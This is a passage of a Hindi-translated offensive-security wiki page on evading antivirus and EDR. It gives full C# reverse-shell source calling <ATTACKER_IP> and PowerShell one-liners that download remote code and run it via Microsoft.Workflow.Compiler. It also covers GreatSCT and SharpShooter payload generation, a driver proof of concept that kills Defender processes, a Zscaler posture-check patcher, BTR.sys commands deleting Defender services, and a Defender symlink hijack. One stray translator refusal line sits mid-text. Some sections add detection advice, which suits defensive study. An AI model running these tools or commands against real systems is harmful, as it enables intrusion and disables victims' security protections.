- मदद के लिए `winvnc -h` न चलाएँ, वरना एक [popup](https://i.imgur.com/oc18wcu.png) trigger होगा

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT के अंदर:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

अब `msfconsole -r file.rc` के साथ **lister** शुरू करें और **xml payload** को execute करें:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**मौजूदा Defender प्रक्रिया को बहुत जल्दी समाप्त कर देगा।**

### अपना reverse shell कंपाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इससे कंपाइल करें:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

इसके साथ इसका उपयोग करें:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# कंपाइलर का उपयोग

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injector बनाने के लिए python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## अपना Vulnerable Driver लाएँ (BYOVD) – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware drop करने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह टूल अपना **vulnerable लेकिन *signed* driver** लाता है और उसका दुरुपयोग करके privileged kernel operations जारी करता है, जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर सकतीं।<sup>[[12]](#references)</sup>

मुख्य बातें
1. **Signed driver**: Disk पर भेजी गई फ़ाइल `ServiceMouse.sys` है, लेकिन binary Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से signed driver `AToolsKrnl64.sys` है। चूँकि driver पर एक वैध Microsoft signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   पहली लाइन driver को **kernel service** के रूप में रजिस्टर करती है और दूसरी उसे शुरू करती है, जिससे `\\.\ServiceMouse` user land से accessible हो जाता है।
3. **Driver द्वारा expose किए गए IOCTLs**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID द्वारा किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए इस्तेमाल किया जाता है) |
   | `0x990000D0` | डिस्क पर मौजूद किसी भी file को delete करना |
   | `0x990001D0` | driver को unload करना और service को remove करना |

   न्यूनतम C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **यह क्यों काम करता है**: BYOVD user-mode सुरक्षा को पूरी तरह छोड़ देता है; kernel में execute होने वाला code *संरक्षित* processes को खोल सकता है, उन्हें terminate कर सकता है या kernel objects के साथ छेड़छाड़ कर सकता है—PPL/PP, ELAM या अन्य hardening features की परवाह किए बिना।

Detection / Mitigation
• Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) सक्षम करें, ताकि Windows `AToolsKrnl64.sys` को load करने से मना कर दे।
• नई *kernel* services के बनने पर नज़र रखें और alert करें, जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो।
• Custom device objects के लिए user-mode handles और उसके बाद होने वाली संदिग्ध `DeviceIoControl` calls पर नज़र रखें।

### On-Disk Binary Patching के ज़रिए Zscaler Client Connector Posture Checks को Bypass करना

Zscaler का **Client Connector** device-posture rules को स्थानीय रूप से लागू करता है और परिणामों को अन्य components तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। डिज़ाइन के दो कमज़ोर विकल्प पूर्ण bypass को संभव बनाते हैं:

1. Posture evaluation **पूरी तरह client-side** होती है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (`WinVerifyTrust` के ज़रिए)।<sup>[[11]](#references)</sup>

**Disk पर चार signed binaries को patch करके**, दोनों mechanisms को निष्क्रिय किया जा सकता है:

| Binary | Patch किया गया original logic | परिणाम |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को Indirect call | NOP-ed ⇒ कोई भी process (unsigned भी) RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदला गया |
| `ZSATunnel.exe` | Tunnel पर integrity checks | Short-circuited |

Patcher का न्यूनतम अंश:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

मूल फ़ाइलें बदलने और service stack रीस्टार्ट करने के बाद:

* **सभी** posture checks हरे/अनुपालन में दिखते हैं।
* Unsigned या modified binaries named-pipe RPC endpoints खोल सकती हैं (उदा., `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* Compromised host को Zscaler policies से परिभाषित internal network तक unrestricted access मिल जाता है।

यह case study दिखाती है कि केवल client-side trust decisions और साधारण signature checks को कुछ byte patches से कैसे हराया जा सकता है।

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender का **Boot-Time Removal** driver, classic BYOVD का एक उपयोगी counterexample है। `BTR.sys` एक वैध Microsoft-signed remediation component है, जिसमें memory-corruption bug या IOCTL interface नहीं है; administrator access और `SeLoadDriverPrivilege` हासिल करने के बाद, operator इसके बजाय इसके private remediation transaction को forge करके इच्छित Ring-0 file/registry operations प्राप्त कर सकता है। यह **post-compromise AV/EDR-neutralization primitive है, initial access या privilege escalation नहीं**, और driver को किसी स्पष्ट third-party driver को लाने के बजाय target की अपनी `MpEngine.dll` के `BOOTTIMETOOL` resource से extract किया जा सकता है।<sup>[[36]](#references)</sup>

### One-shot driver को stage करना

Defender सामान्यतः इस resource को random `[a-z]{8}.sys` फ़ाइल के रूप में छोड़ता है और इसी तरह नाम वाली kernel service register करता है। `DriverEntry` service की `Args` value पढ़ता है, संदर्भित NTFS ADS खोलता है, action list को decrypt और validate करता है, feedback लिखता है, और सफल execution के बाद `0xC0000056` (`STATUS_DELETE_PENDING`) लौटाता है, ताकि driver resident रहने के बजाय unload हो जाए। Forged service में निम्नलिखित विशिष्ट values होती हैं।<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream में एक RC4-encrypted blob होता है। विश्लेषित builds में एक fixed 256-byte key दोबारा इस्तेमाल होती है, इसलिए encryption authorization boundary नहीं है। एक मान्य plaintext में 24-byte global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC और payload-derived transaction ID) होता है, जिसके बाद null-terminated UTF-16 feedback path और कोई भी संख्या में items होते हैं। हर item में 16-byte header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) और action-specific data होता है, जो **ठीक चार NUL bytes** पर समाप्त होता है। हर header/data region की जाँच स्वतंत्र रूप से CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF` और **बिना final XOR** (`~CRC32`) से की जाती है; हर region के लिए CRC state reset होता है।<sup>[[36]](#references)[[37]](#references)</sup>

स्वीकृत action IDs इन kernel primitives को उजागर करते हैं।<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | किसी file को delete करना, locked file सहित |
| 2 | `[UTF-16 path]` | खाली directory हटाना |
| 3 | `[Flags][source][destination]` | किसी file को attacker द्वारा चुने गए protected path पर move करना; खाली destination का अर्थ delete करना है |
| 4 | `[Flags][key path]` | किसी registry key को recursively delete करना |
| 5 | `[Flags][key path + "\\" + value]` | किसी registry value को delete करना |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | किसी registry value को create/update करना और अनुपस्थित key paths बनाना |

Actions 5 और 6 के लिए, on-wire key/value separator में **दो लगातार backslashes** होते हैं; सामान्य तरीके से format किया गया path सही ढंग से split नहीं होगा। Feedback file में ज़्यादातर request की ही जानकारी होती है, लेकिन हर item के पहले चार data bytes उसके परिणामी `NTSTATUS` बन जाते हैं। Actions 1 और 2 में, जिनमें शुरुआती flags field नहीं होता, BTR path को उन चार reserved trailing bytes में shift कर देता है ताकि उस status के लिए जगह बन सके।<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow और early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) पूरी chain लागू करता है: local Defender से `BTR.sys` निकालना, `<random>.sys:changelist` और एक feedback stream बनाना, chained actions को serialize/checksum/encrypt करना, सीधे service registry key बनाना, फिर `-trigger now` के लिए `NtLoadDriver` call करना या `-trigger boot` के लिए उसे system-start driver के रूप में छोड़ देना। सीधे registry staging करने से सामान्य SCM `CreateServiceW` path से बचा जाता है और इसलिए service-install Event ID 7045 नहीं बनता। Boot-triggered artifacts को बाद में `BTR_CLI.exe -cleanup <service_name>` से हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` उपयोगी नहीं है, क्योंकि storage stack और `SystemRoot` link तैयार होने से पहले BTR, `DriverEntry` से file I/O करता है। इसके बजाय, `Start=1` और high-priority `Boot Bus Extender` group का उपयोग करने पर यह Phase 1 में चलता है: NTFS उपयोग के लिए तैयार होता है, लेकिन कई system-start security drivers और user-mode EDR services अभी initialize नहीं हुए होते। `WdFilter` जैसे boot-start filters पहले से load हो चुके हो सकते हैं, फिर भी BTR अगले start से पहले उनकी binaries या service configuration हटा सकता है और SCM द्वारा उन्हें launch करने से पहले service executables delete कर सकता है। ELAM इस अंतर को दूर नहीं करता, क्योंकि BTR boot-start evaluation के बाद चलता है और उसके पास एक valid Microsoft signature होता है।<sup>[[36]](#references)</sup>

एक transaction में कई actions चलते हैं। PoC, hard-coded `\SystemRoot\Temp\BootClean.log` के लिए Action 1 को सबसे पहले जोड़ता है: BTR यह log बनाता है, फिर अपना ही delete request पूरा करके unload होने से पहले उसे हटा देता है। इससे evidence कम होता है। वहीं, feedback को `<random>.sys:<random>.dat` में रखने पर driver और दोनों streams को एक साथ हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

### उच्च-signal detection correlations

केवल signature पर आधारित rules और Microsoft vulnerable-driver blocklist, BTR की intended functionality के दुरुपयोग को नहीं रोकते। इन behavioral correlations को प्राथमिकता दें और साथ ही legitimate Defender lineage को किसी भी arbitrary launcher से अलग पहचानें।<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` का बनना, BTR staging में हमेशा होता है। उसी `.sys` से जुड़ा `.dat` ADS विशेष रूप से संदिग्ध है, क्योंकि legitimate Defender आम तौर पर feedback को `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` के नीचे रखता है।
- **Sysmon 12/13 के साथ System 7045 न होना:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>` में `Args=...:changelist` और `Group=Boot Bus Extender` वाली direct creation को correlate करें, जब उससे मेल खाने वाला कोई SCM installation event न हो।
- **Sysmon 6 -> 23:** किसी non-Defender lineage से ज्ञात BTR driver load होने के बाद `System`/PID 4 से संबद्ध file deletion को correlate करें, विशेष रूप से security binaries के लिए।
- **Sysmon 11 -> 23:** `System`/PID 4 द्वारा `\SystemRoot\Temp\BootClean.log` को तेज़ी से बनाने और हटाने पर alert करें।
- `SeLoadDriverPrivilege` के assignment/enabling को सीमित करें और audit करें; जब किसी security-tool driver को `cmd.exe`, PowerShell या किसी अज्ञात process से stage किया जाए, तो केवल Microsoft signature पर्याप्त भरोसे का आधार नहीं है।

## LOLBINs से AV/EDR में छेड़छाड़ के लिए Protected Process Light (PPL) का दुरुपयोग

Protected Process Light (PPL), signer/level hierarchy लागू करता है ताकि केवल समान या उच्चतर स्तर के protected processes ही एक-दूसरे में छेड़छाड़ कर सकें। Offensive तौर पर, यदि आप वैध रूप से PPL-enabled binary launch कर सकें और उसके arguments को नियंत्रित कर सकें, तो logging जैसी benign functionality को AV/EDR द्वारा उपयोग की जाने वाली protected directories के विरुद्ध सीमित, PPL-backed write primitive में बदल सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

PPL के रूप में process चलाने के लिए
- Target EXE (और load की गई किसी भी DLL) पर PPL-capable EKU से signature होना चाहिए।
- Process को `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` flags के साथ CreateProcess का उपयोग करके बनाया जाना चाहिए।
- Binary के signer से मेल खाने वाला compatible protection level मांगा जाना चाहिए (जैसे, anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels पर creation विफल हो जाएगा।

PP/PPL और LSASS protection के व्यापक परिचय के लिए यह भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level चुनता है और target EXE को arguments देता है):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- उपयोग का तरीका:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

मैं AV को bypass करने और protected system files को भ्रष्ट करने की चरण-दर-चरण प्रक्रिया का अनुवाद नहीं कर सकता। मैं इसके बजाय इसका सुरक्षित, उच्च-स्तरीय रक्षात्मक सारांश अनुवाद कर सकता हूँ।

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes और सीमाएँ
- आप ClipUp द्वारा लिखी जाने वाली सामग्री को नियंत्रित नहीं कर सकते; केवल उसका स्थान तय कर सकते हैं। यह primitive सटीक सामग्री inject करने के बजाय corruption के लिए उपयुक्त है।
- सेवा install/start करने और reboot window के लिए local admin/SYSTEM आवश्यक है।
- Timing महत्वपूर्ण है: target खुला नहीं होना चाहिए; boot-time execution से file locks से बचा जा सकता है।

पता लगाना
- Boot के आसपास असामान्य arguments के साथ `ClipUp.exe` process का बनना, खासकर जब उसका parent कोई non-standard launcher हो।
- Suspicious binaries को auto-start करने के लिए configured नई services, जो लगातार Defender/AV से पहले start होती हों। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा अप्रत्याशित file creation/modification।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा PPL level के असामान्य उपयोग पर नज़र रखें।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन-से signed binaries PPL के रूप में और किन parent processes के तहत चल सकते हैं; वैध contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services बनाने/संशोधित करने पर पाबंदी लगाएँ और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हों; binary corruption के संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के अनुकूल हो, तो security tooling वाले volumes पर 8.3 short-name generation को disable करने पर विचार करें (अच्छी तरह test करें)।

## Platform Version Folder Symlink Hijack के ज़रिए Microsoft Defender के साथ छेड़छाड़

Windows Defender उस platform का चयन करता है जिससे वह यहाँ मौजूद subfolders की जाँच करके चलता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह सबसे ऊँची lexicographic version string वाला subfolder चुनता है (उदाहरण के लिए, `4.18.25070.5-0`), फिर वहाँ से Defender service processes शुरू करता है (और service/registry paths को उसी के अनुसार update करता है)। यह चयन directory reparse points (symlinks) सहित directory entries पर भरोसा करता है। Administrator इसका लाभ उठाकर Defender को attacker-writable path पर redirect कर सकता है और DLL sideloading या service disruption कर सकता है।<sup>[[21]](#references)[[22]](#references)</sup>

पूर्वापेक्षाएँ
- Local Administrator (Platform folder के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform का दोबारा चयन करवाने की क्षमता (boot पर service restart)
- केवल built-in tools आवश्यक हैं (`mklink`)

यह क्यों काम करता है
- Defender अपने folders में writes को block करता है, लेकिन उसका platform selection directory entries पर भरोसा करता है और यह सत्यापित किए बिना lexicographically सबसे ऊँचा version चुनता है कि target किसी protected/trusted path पर resolve होता है या नहीं।

चरण-दर-चरण (उदाहरण)
1) मौजूदा platform folder की writable clone तैयार करें, उदाहरण के लिए `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने फ़ोल्डर की ओर संकेत करने वाला higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger का चयन (reboot की अनुशंसा की जाती है):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) redirected path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाली service configuration/registry दिखाई देनी चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Defender द्वारा अपनी application directory से load की जाने वाली DLLs को code execute करने के लिए Defender की processes में drop/replace करें। ऊपर का section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying)।
- Service kill/denial: version-symlink हटाएँ, ताकि अगली बार start होने पर configured path resolve न हो और Defender start न हो पाए:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> ध्यान दें कि यह technique अपने आप privilege escalation नहीं देती; इसके लिए admin rights की आवश्यकता होती है।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से निकालकर सीधे target module में ले जा सकती हैं। इसके लिए वे उसके Import Address Table (IAT) को hook करती हैं और चुनी हुई APIs को attacker-controlled, position‑independent code (PIC) के ज़रिए route करती हैं। इससे evasion का दायरा उन छोटी API surfaces से आगे बढ़ता है जिन्हें कई kits उपलब्ध कराती हैं (जैसे, CreateProcessA), और यही protections BOFs तथा post‑exploitation DLLs तक भी पहुँचती हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

उच्च-स्तरीय तरीका
- Reflective loader (prepend या companion) का उपयोग करके target module के साथ एक PIC blob stage करें। PIC self‑contained और position‑independent होना चाहिए।
- Host DLL लोड होते समय, उसके IMAGE_IMPORT_DESCRIPTOR को traverse करें और targeted imports (जैसे, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के IAT entries को thin PIC wrappers पर point करने के लिए patch करें।
- हर PIC wrapper, real API address को tail-call करने से पहले evasions चलाता है। आम evasions में शामिल हैं:
  - Call के दौरान memory को mask/unmask करना (जैसे, beacon regions को encrypt करना, RWX→RX करना, page names/permissions बदलना), फिर call के बाद उन्हें restore करना।
  - Call-stack spoofing: एक benign stack बनाना और target API में transition करना, ताकि call-stack analysis में अपेक्षित frames resolve हों।<sup>[[9]](#references)</sup>
- Compatibility के लिए, ऐसा interface export करें जिससे Aggressor script (या समकक्ष) यह register कर सके कि Beacon, BOFs और post-ex DLLs के लिए किन APIs को hook करना है।

यहाँ IAT hooking क्यों
- यह उस किसी भी code के लिए काम करता है जो hooked import का उपयोग करता है—इसके लिए tool code में बदलाव करने या Beacon पर specific APIs को proxy करने की निर्भरता नहीं होती।
- Post-ex DLLs को भी cover करता है: LoadLibrary* को hook करने से आप module loads (जैसे, System.Management.Automation.dll, clr.dll) intercept कर सकते हैं और उनकी API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके, call-stack–based detections के बावजूद process-spawning post-ex commands का भरोसेमंद उपयोग बहाल करता है।

न्यूनतम IAT hook स्केच (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
नोट्स
- relocations/ASLR के बाद और import के पहले उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे Reflective loaders, लोड किए गए module के DllMain के दौरान hooking करने के उदाहरण हैं।
- wrappers छोटे और PIC-safe रखें; patching से पहले कैप्चर किए गए मूल IAT value या LdrGetProcedureAddress के ज़रिए वास्तविक API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable pages न छोड़ें।

Call-stack spoofing stub
- Draugr-शैली के PIC stubs एक नकली call chain (benign modules के return addresses) बनाते हैं और फिर वास्तविक API तक पहुँचते हैं।
- इससे वे detections विफल होते हैं जो संवेदनशील APIs तक Beacon/BOFs से आने वाले canonical stacks की अपेक्षा करते हैं।
- API prologue से पहले अपेक्षित frames में पहुँचने के लिए इन्हें stack cutting/stack stitching techniques के साथ इस्तेमाल करें।

ऑपरेशनल एकीकरण
- reflective loader को post-ex DLLs से पहले जोड़ें, ताकि DLL लोड होने पर PIC और hooks अपने-आप initialize हों।
- target APIs register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs को बिना code changes के उसी evasion path का पारदर्शी लाभ मिले।

Detection/DFIR संबंधी विचार
- IAT integrity: ऐसी entries जो non-image (heap/anon) addresses पर resolve हों; import pointers का समय-समय पर सत्यापन।
- Stack anomalies: ऐसे return addresses जो loaded images से संबंधित न हों; non-image PIC पर अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in-process writes, import thunks को बदलने वाली शुरुआती DllMain activity, load के समय बनाए गए अप्रत्याशित RX regions।
- Image-load evasion: यदि LoadLibrary* की hooking की गई हो, तो memory masking events के साथ संबंधित automation/clr assemblies के संदिग्ध loads पर नज़र रखें।

संबंधित building blocks और उदाहरण
